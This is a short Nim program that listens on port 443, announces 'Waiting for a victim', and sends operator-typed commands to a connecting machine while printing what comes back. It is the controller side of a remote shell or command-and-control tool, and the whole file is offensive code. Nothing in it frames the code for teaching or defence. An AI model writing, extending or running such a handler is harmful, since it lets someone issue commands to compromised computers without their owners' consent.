import net
#To Do
var server: Socket = newSocket()
#server.setSockOpt(OptReuseAddr, true)
server.bindAddr(Port(443))
server.listen()
stdout.writeLine("Waiting for a victim ....")

var client: Socket 
var address = ""
var cmresult: string
while true:
  server.acceptAddr(client,address)
  echo("Client connected from: ", address)
  
  var command = readLine(stdin)
  echo(command)
  
  client.send(command)
  echo("received res")
  cmresult = client.recvLine()  
  stdout.writeLine(cmresult)

  if cmresult == "bye":
    break

server.close()